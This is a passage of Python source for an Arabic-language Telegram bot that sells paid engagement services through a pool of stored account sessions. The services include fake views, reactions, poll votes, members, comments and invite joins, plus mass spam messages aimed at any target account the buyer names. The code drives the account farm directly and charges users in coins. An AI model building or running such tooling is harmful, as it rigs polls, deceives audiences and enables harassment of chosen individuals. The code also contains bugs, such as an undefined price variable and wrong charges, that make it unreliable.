                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = react_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية :  {amount} \n\n• ارسل الان التفاعل الذي تريد ارساله')
            bot.register_next_step_handler(x, get_react, amount)
            return
    if type == 'forward':
        if not db.get(f'forward_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10 ',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500 ',reply_markup=bk)
                return
            pr = forward_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية :  {amount} \n\n• ارسل الان رابط المنشور الذي تريد رشق التوجيهات عليه')
            bot.register_next_step_handler(x, get_url_forward, amount)
            return
    if type == 'poll':
        if not db.get(f'poll_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10 ',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500 ',reply_markup=bk)
                return
            pr = poll_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية :  {amount} \n\n• ارسل الان رابط المنشور الذي تريد رشق التوجيهات عليه')
            bot.register_next_step_handler(x, get_url_poll, amount)
            return
    if type == 'reactsrandom':
        if not db.get(f'reacts_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = react_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• تم اختيار الكمية  {amount} \n• ارسل الان رابط المنشور الذي تريد رشقه')
            bot.register_next_step_handler(x, get_reacts_url, amount)
            return
    if type == 'view':
        if not db.get(f'view_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = view_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان رابط المنشور الذي تريد رشقه')
            bot.register_next_step_handler(x, get_view_url, amount)
            return
    if type == 'votes':
        if not db.get(f'vote_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'رجاء ارسل عدد اكبر من  10 ',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اكبر من  500 ',reply_markup=bk)
                return
            pr = vote_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'نقاطك غير كافية لتنفيذ طلبك ، تحتاج الى {pr-amount} نقطة .')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت لا تكفي لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• تم اختيار الكمية {amount} عضو\n• الان ارسل وقت الإنتضار بين الرشق (بالثواني) \n\n• ارسل 0 اذا كنت تريده فوري\n• يجب ان لايزيد عن 500')
            bot.register_next_step_handler(x, get_time_votes, amount)
            return
    
    if type == 'msgs':
        if not db.get(f'spam_{cid}_proccess'): return
        if message.text:
            amount = None
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message,f'• رجاء ارسل عدد فقط ، اعد المحاولة لاحقا',reply_markup=bk)
                return
            load_ = db.get('accounts')
            if amount < 1:
                bot.reply_to(message, f'• رجاء ارسل عدد اكبر من 10', reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'• رجاء ارسل عدد اقل من 500',reply_markup=bk)
                return
            
            if len(load_) < amount:
                bot.reply_to(message,text=f'• عدد حسابات البوت لا تكفي لتنفيذ طلبك',reply_markup=bk)
                return
            pr = spam_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if acc['coins'] < pr:
                bot.reply_to(message,f'• نقاطك غير كافية لتنفيذ طلبك ، تحتاج الي {pr-amount} نقطه',reply_markup=bk)
                return
            x = bot.reply_to(message,text=f'• الان ارسل يوزر او رابط الحساب اللي تريد تعمل سبام عليه')
            bot.register_next_step_handler(x, get_url_spam, amount)
            return
    if type == 'userbot':
        if not db.get(f'userbot_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = userbot_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان رابط ااو معرف البوت اللي تريد ترشقله مستخدمين')
            bot.register_next_step_handler(x, get_bot_user, amount)
            return
    if type == 'linkbot':
        if not db.get(f'linkbot_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = linkbot_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان رابط الدعوة الخاص بك ')
            bot.register_next_step_handler(x, link_bot, amount)
            return
    if type == 'linkbot2':
        if not db.get(f'linkbot2_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = linkbot2_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان رابط الدعوة الخاص بك ')
            bot.register_next_step_handler(x, link_bot2, amount)
            return
    if type == 'comments':
        if not db.get(f'comments_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 1:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = comment_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان رابط المنشور اللي تريد التعليق عليه \n\n يجب ان تنسخ منشور القناة من مجموعة المناقشة وليس من القناة نفسها')
            bot.register_next_step_handler(x, get_comments_url, amount)
            return
###########
def get_time_votes(message, amount):
    try:
        time = int(message.text)
    except:
        x = bot.reply_to(message,text=f'• رجاء ارسل الوقت بشكل صحيح')
        return
    if time <0:
        x = bot.reply_to(message,text=f'• رجاء ارسل وقت الرشق بين 0 و 500')
        return
    if time >500:
        x = bot.reply_to(message,text=f'• رجاء ارسل وقت الرشق بين 0 و 500')
        return
    x = bot.reply_to(message,f'• الكمية {amount}\n• الوقت بين التصويت : {time}\n\n• الان أرسل لي رابط المنشور')
    bot.register_next_step_handler(x, get_url_votes, amount, time)
def link_bot2(message, amount):
    url = message.text
    if 'https://t.me' in url:
        x = bot.reply_to(message,text=f'• الكمية : {amount}\n• الرابط : {url}\n\n• الان ارسل رابط او معرف قناة الاشتراك الاجبارى')
        bot.register_next_step_handler(x, linkbot_chforce, amount, url)
    else:
        x = bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
def dump_votes(message):
    url = message.text
    load_ = db.get('accounts')
    num = len(load_)
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'سحب تصويت'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n')
    
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for num in load_:
        try:
            x = asyncio.run(dump_votess(num['s'], url))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(f"Erorr: {e}")
            continue
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n\n• تم سحب : {false} تصويت\n• لم يتم سحب : {true}',reply_markup=bk)
def lespoints(message):
    if message.text == "/start":
        start_message(message)
        return
    id = message.text
    try:
        id = int(message.text)
    except:
        bot.reply_to(message, f'• ارسل الايدي بشكل صحيح رجاء')
        return
    x = bot.reply_to(message, '• ارسل الان الكمية :')
    bot.register_next_step_handler(x, lespoints_final, id)
def lespoints_final(message, id):
    if message.text == "/start":
        start_message(message)
        return
    amount = message.text
    try:
        amount = int(message.text)
    except:
        bot.reply_to(message, f'يجب ان تكون الكمية ارقام فقط')
        return
    b = db.get(f'user_{id}')
    b['coins']-=amount
    db.set(f'user_{id}', b)
    bot.reply_to(message, f'تم بنجاح نقاطه الان : {b["coins"]} ') 
def linkbot_chforce(message, amount, url):
    channel_force = message.text.replace('https://t.me/', '').replace('@', '')
    bot_id, user_id = url.split("?start=")[0].split("/")[-1], url.split("?start=")[1]
    channel = "@" + bot_id
    tex = "/start " + user_id
    pr = linkbot2_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'رابط دعوة اشتراك اجبارى'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}\n• قناة الاشتراك الاجبارى : @{channel_force}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(linkbot2(y['s'], channel, tex, channel_force))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= linkbot2_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لم يتم ارسال : {false} \n• تم خصم : {true*linkbot2_price}',reply_markup=bk)
    return
##################
def get_comments_url(message, amount):
    url = message.text
    admins = db.get('admins')
    if 'https://t.me' in url:
        x = bot.reply_to(message,text=f'• الكمية : {amount}\n• الرابط : {url}\n\n• الان ارسل التعليق الذي تريد رشقه')
        bot.register_next_step_handler(x, comment_text, amount, url)
    else:
        x = bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
def comment_text(message, amount, url):
    admins = db.get('admins')
    text = message.text
    if text:
        if len(text) > 100:
            bot.reply_to(message, text='• ارسل رسالة تكون اقل من 100 حرف ')
            return
        acc = db.get(f'user_{message.from_user.id}')
        pr = comment_price * amount
        load_ = db.get('accounts')
        typerr = 'تعليقات خدمة ViP'
        bot.reply_to(message,text=f'• جارى تنفيذ طلبك بنجاح ✅\n\n• النوع : {typerr}\n• الرابط : {url}\n• الكمية : {amount}')
        bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr} .\n• العدد : {amount}\n• الرابط : {url}\n• ايديه: {message.from_user.id} \n• يوزره : @{message.from_user.username}')
        true, false = 0, 0
        for y in load_:
            if true >= amount:
                break
            try:
                x = asyncio.run(send_comment(y['s'], url, text))
                true += 1
            except:
                false += 1
                continue
        if true >= 1:
            for ix in range(true):
                acc['coins'] -= comment_price
            db.set(f'user_{message.from_user.id}', acc)
        else:
            pass
        addord()
        user_id = message.from_user.id
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        buys+=1
        db.set(f"user_{user_id}_buys", int(buys))
        bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true} \n• لم يتم ارسال : {false}\n• تم خصم : {true*comment_price} من رصيدك',reply_markup=bk)
        return
########################
def link_bot(message, amount):
    admins = db.get('admins')
    url = message.text
    bot_id, user_id = url.split("?start=")[0].split("/")[-1], url.split("?start=")[1]
    channel = "@" + bot_id
    tex = "/start " + user_id
    pr = linkbot_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'رابط دعوة بدون اشتراك اجبارى'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(linkbot(y['s'], channel, tex))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= linkbot_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لم يتم ارسال : {false} \n• تم خصم : {true*linkbot_price}',reply_markup=bk)
    return

def get_bot_user(message, amount):
    admins = db.get('admins')
    url = message.text.replace('https://t.me/', '').replace('@', '')
    pr = userbot_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'مستخدمين بوت'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr} \n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(userbot(y['s'], url))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= userbotprice
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لم يتم ارسال : {false} \n• تم خصم : {true*userbot_price}',reply_markup=bk)
    return
    
def get_url_spam(message, amount):
    url = message.text
    admins = db.get('admins')
    if 'https://t.me' in url or '@' in url:
        x = bot.reply_to(message,text=f'• الان ارسل الرسالة اللي تريد ترسلها للحساب')
        bot.register_next_step_handler(x, get_text, amount, url)
        return

def get_text(message, amount, url):
    admins = db.get('admins')
    text = message.text
    if text:
        if len(text) > 1000:
            bot.reply_to(message, text='• ارسل رسالة تكون اقل من 1000 حرف ')
            return
        acc = db.get(f'user_{message.from_user.id}')
        pr = spam_price * amount
        load_ = db.get('accounts')
        typerr = 'رسائل مزعجة خدمة ViP'
        bot.reply_to(message,text=f'• جارى تنفيذ طلبك بنجاح ✅\n\n• النوع : {typerr}\n• الرابط : {url}\n• الكمية : {amount}')
        bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr} .\n• العدد : {amount}\n• الرابط : {url}\n• ايديه: {message.from_user.id} \n• يوزره : @{message.from_user.username}')
        true, false = 0, 0
        for y in load_:
            if true >= amount:
                break
            try:
                x = asyncio.run(send_message(y['s'], chat=url, text=text))
                true += 1
            except:
                false += 1
                continue
        if true >= 1:
            for ix in range(true):
                acc['coins'] -= spam_price
            db.set(f'user_{message.from_user.id}', acc)
        else:
            pass
        addord()
        user_id = message.from_user.id
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        buys+=1
        db.set(f"user_{user_id}_buys", int(buys))
        bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true} \n• لم يتم ارسال : {false}\n• تم خصم : {true*spam_price} من رصيدك',reply_markup=bk)
        return

def get_url_memp(message, amount):
    admins = db.get('admins')
    url = message.text
    load = db.get('accounts')
    info = get(message.from_user.id)
    price = member_price * amount
    if price > int(info['coins']):
        bot.reply_to(message,text=f'نقاطك غير كافية لتنفيذ طلبك تحتاج الي   {price - int(info["coins"])}  ',reply_markup=bk)
        return
    if len(load) < 1:
        bot.reply_to(message,text='عدد حسابات البوت لا تكفي لتنفيذ طلبك ',reply_markup=bk)
        return
    typerr = 'رشق اعضاء قناة خاصة خدمة ViP'
    v = bot.reply_to(message,text=f'• تم بدء طلبك بنجاح ✅\n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت \n• النوع: {typerr}\n• العدد : {amount}\n• الرابط : {url}\n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username}')
    true, false = 0, 0
    for y in load:
        if true >= amount:
            break
        try:
            x = asyncio.run(join_chatp(y['s'], url))
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            pass
    if true >= 1:
        for ix in range(true):
            info['coins'] -= member_price
        db.set(f'user_{message.from_user.id}', info)
    else:
        pass
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true} .\n• لم يتم ارسال : {false}\n• تم خصم : {true*member_price} من رصيدك ',)
    return

def get_url_mem(message, amount):
    admins = db.get('admins')
    url = message.text
    if 'https://t.me' in url or '@' in url:
        if detect(url):
            load = db.get('accounts')
            info = get(message.from_user.id)
            price = member_price * amount
            if price > int(info['coins']):
                bot.reply_to(message,text=f'مامعك نقاط كافية، تحتاج   {price - int(info["coins"])}   نقطة علمود ترسل هذا العدد',reply_markup=bk)
                return
            if len(load) < 1:
                bot.reply_to(message,text='عدد حسابات البوت لا تكفي لتنفيذ طلبك ',reply_markup=bk)
                return
            typerr = 'رشق اعضاء خدمة ViP'
            v = bot.reply_to(message,text=f'• تم بدء طلبك بنجاح ✅\n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}')
            bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت \n• النوع: {typerr}\n• العدد : {amount}\n• الرابط : {url}\n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username}')
            true, false = 0, 0
            for y in load:
                if true >= amount:
                    break
                try:
                    x = asyncio.run(join_chat(y['s'], url))
                    if x == 'o':
                        continue
                    if x == True:
                        true += 1
                    else:
                        false += 1
                except Exception as e:
                   pass
            if true >= 1:
                for ix in range(true):
                    info['coins'] -= member_price
                db.set(f'user_{message.from_user.id}', info)
            else:
                pass
            bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true} .\n• لم يتم ارسال : {false}\n• تم خصم : {true*member_price} من رصيدك ',)
            return
        else:
            username = url.replace('https://t.me/', '').replace('@', '')
            load = db.get('accounts')
            info = get(message.from_user.id)
            price = member_price * amount
            if price > int(info['coins']):
                bot.reply_to(message,text=f'• نقاطك غير كافية : تحتاج الي   {price - int(info["coins"])}   نقطة',reply_markup=bk)
                return
            if len(load) < 1:
                bot.reply_to(message,text=f'• حسابات البوت لا تكفي لتنفيذ طلبك',reply_markup=bk)
                return
            typerr = 'رشق اعضاء خدمة ViP'
            v = bot.reply_to(message,text=f'• تم بدء طلبك بنجاح ✅\n\n• النوع : {typerr}\n• اليوزر : @{username}\n• الكمية : {amount}')
            bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount}\n• الرابط : {url}\n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
            true, false = 0, 0
            for y in load:
                if true >= amount:
                    break
                try:
                    x = asyncio.run(join_chat(y['s'], username))
                    if x == 'o':
                        continue
                    if x == True:
                        true += 1
                    else:
                        false += 1
                except Exception as e:
                   
                    continue
            for i in range(true):
                info['coins'] -= member_price
            db.set(f'user_{message.from_user.id}', info)
            addord()
            user_id = message.from_user.id
            buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
            buys+=1
            db.set(f"user_{user_id}_buys", int(buys))
            bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true} \n• لم يتم ارسال : {false}\n• تم خصم : {true*member_price} من رصيدك',)
            return


def checks(link):
    admins = db.get('admins')
    pattern = r"https?://t\.me/(\w+)/(\d+)"
    match = re.match(pattern, link)

    if match:
        username = match.group(1)
        post_id = match.group(2)
        return username, post_id
    else:
        return False

def get_react(message, amount):
    rs = ["👍","🤩","🎉","🔥","❤️","🥰","🥱","🥴","🌚","🍌","💔","🤨","😐","🖕","😈","👎","😁","😢","💩","🤮","🤔","🤯","🤬","💯","😍","🕊","🐳","🤝","👨","🦄","🎃","🤓","👀","👻","🗿","🍾","🍓","⚡️","🏆","🤡","🌭","🆒","🙈","🎅","🎄","☃️","💊"]
    if message.text in rs:
        x = bot.reply_to(message,f'• تم اختيار الكمية {amount}\n• التفاعل : {message.text}\n\n• ارسل الان رابط المنشور لرشق التفاعلات عليه')
        bot.register_next_step_handler(x, get_url_react, amount, message)
    else:
        x = bot.reply_to(message,f'• رجاء ارسل التفاعل بشكل صحيح')
        bot.register_next_step_handler(x, get_react, amount)
        return
def get_url_votes(message, amount, time):
    admins = db.get('admins')
    url = message.text
    if not checks(url):
        bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
    pr = vote_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'تصويت'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}\n• الوقت بين التصويت : {time}')
    prog = bot.send_message(chat_id=int(message.from_user.id), text=f'• عزيزي تبقي {amount} علي اكتمال طلبك ....')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username}\n• الوقت بين التصويت : {time} ')
    true, false = 0, 0
    nume = int(amount)
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(vote_one(y['s'], url, time))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
                nume -= 1
                bot.edit_message_text(chat_id=message.from_user.id, message_id=prog.message_id, text=f'• عزيزي تبقي {nume} علي اكتمال طلبك ....')
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= vote_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لك يتم ارسال : {false} \n• تم خصم : {true*vote_price}',reply_markup=bk)
    return
    
def get_url_react(message, amount, like):
    admins = db.get('admins')
    url = message.text
    like = like.text
    if not checks(url):
        bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
    pr = react_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'تفاعلات اختياري'
    v = bot.reply_to(message,text=f'• تم بدء طلبك بنجاح ✅ : \n\n• النوع : {typerr}\n• التفاعل : {like}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(reactions(y['s'], url, like))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= vote_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لك يتم ارسال : {false} \n• تم خصم : {true*react_price}',reply_markup=bk)
    return
def get_reacts_url(message, amount):
    admins = db.get('admins')
    url = message.text
    if not checks(url):
